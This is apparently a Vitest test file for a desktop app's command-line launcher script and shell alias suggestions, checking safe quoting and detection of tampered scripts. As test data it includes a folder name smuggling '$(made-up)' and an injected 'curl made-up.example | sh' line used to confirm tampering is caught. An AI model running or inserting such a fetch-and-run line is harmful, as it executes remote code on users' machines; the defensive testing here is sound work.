import { describe, expect, it } from 'vitest';
import { isDorkosScript, runsThisApp, SCRIPT_MARKER, terminalCommandScript } from '../script';
import { shellLineFor } from '../shell-line';

const target = {
  helper:
    '/Applications/DorkOS.app/Contents/Frameworks/DorkOS Helper.app/Contents/MacOS/DorkOS Helper',
  command: '/Applications/DorkOS.app/Contents/Resources/app.asar.unpacked/dist/cli/dorkos.mjs',
};

describe('terminalCommandScript', () => {
  it('runs this app by absolute path, never through PATH', () => {
    const script = terminalCommandScript(target);
    expect(script.startsWith('#!/bin/sh\n')).toBe(true);
    const exec = script.split('\n').find((line) => line.includes('exec'))!;
    expect(exec).toBe(`ELECTRON_RUN_AS_NODE=1 exec '${target.helper}' '${target.command}' "$@"`);
    expect(script).not.toMatch(/PATH=|\bexport\b|\$\(|`/);
  });

  // A folder name is the person's to choose; it must stay one argument and run nothing.
  it('keeps a quote in a folder name inside its argument', () => {
    const odd = { helper: "/Apps/Sam's $(made-up)/Helper", command: '/Apps/x/dorkos.mjs' };
    const exec = terminalCommandScript(odd)
      .split('\n')
      .find((line) => line.includes('exec'))!;
    expect(exec).toContain(`'/Apps/Sam'\\''s $(made-up)/Helper'`);
  });

  it('marks the file as DorkOS’s', () => {
    expect(terminalCommandScript(target).split('\n')[1]).toBe(SCRIPT_MARKER);
  });
});

describe('isDorkosScript and runsThisApp', () => {
  it('knows its own script, and that it runs this copy of the app', () => {
    const script = terminalCommandScript(target);
    expect(isDorkosScript(script)).toBe(true);
    expect(runsThisApp(script, target)).toBe(true);
  });

  it('treats a script for a moved copy of the app as DorkOS’s, but not this app’s', () => {
    const moved = terminalCommandScript({ ...target, helper: '/Users/sam/Downloads/x/Helper' });
    expect(isDorkosScript(moved)).toBe(true);
    expect(runsThisApp(moved, target)).toBe(false);
  });

  it.each([
    [
      'another program’s script',
      '#!/bin/sh\nexec /usr/local/lib/node_modules/dorkos/cli.js "$@"\n',
    ],
    ['the marker on another line', `#!/bin/sh\necho hi\n${SCRIPT_MARKER}\n`],
    ['an empty file', ''],
    ['a binary', '\u0000\u0001ELF'],
  ])('leaves %s alone', (_label, text) => {
    expect(isDorkosScript(text)).toBe(false);
    expect(runsThisApp(text, target)).toBe(false);
  });

  it('does not take an edited script for its own', () => {
    const edited = terminalCommandScript(target).replace('exec', 'curl made-up.example | sh; exec');
    expect(runsThisApp(edited, target)).toBe(false);
  });
});

describe('shellLineFor', () => {
  it.each([
    ['/bin/zsh', '~/.zshrc', "alias dorkos='~/.local/bin/dorkos'"],
    ['/bin/bash', '~/.bashrc', "alias dorkos='~/.local/bin/dorkos'"],
    ['/opt/homebrew/bin/fish', '~/.config/fish/config.fish', "alias dorkos='~/.local/bin/dorkos'"],
    ['/bin/tcsh', '~/.zshrc', "alias dorkos='~/.local/bin/dorkos'"],
    [undefined, '~/.zshrc', "alias dorkos='~/.local/bin/dorkos'"],
  ])('for %s names %s', (shell, file, line) => {
    expect(shellLineFor(shell)).toMatchObject({ file, line });
  });

  // Designer, Nov 13: fish's own `alias dorkos ~/…` form is a line zsh rejects, so a
  // person who copied it into the wrong file got an error. Every shell copies one line.
  it('copies the same line in every shell', () => {
    for (const shell of ['/bin/zsh', '/bin/bash', '/usr/bin/fish', '/bin/tcsh', undefined])
      expect(shellLineFor(shell).line).toBe("alias dorkos='~/.local/bin/dorkos'");
  });

  // Security, Nov 11: an alias for dorkos alone. A PATH line would let anything an agent
  // dropped in ~/.local/bin shadow git, node and the rest.
  it('never moves a folder onto PATH', () => {
    for (const shell of ['/bin/zsh', '/bin/bash', '/usr/bin/fish'])
      expect(shellLineFor(shell).line).not.toMatch(/PATH|fish_add_path|export/);
  });
});
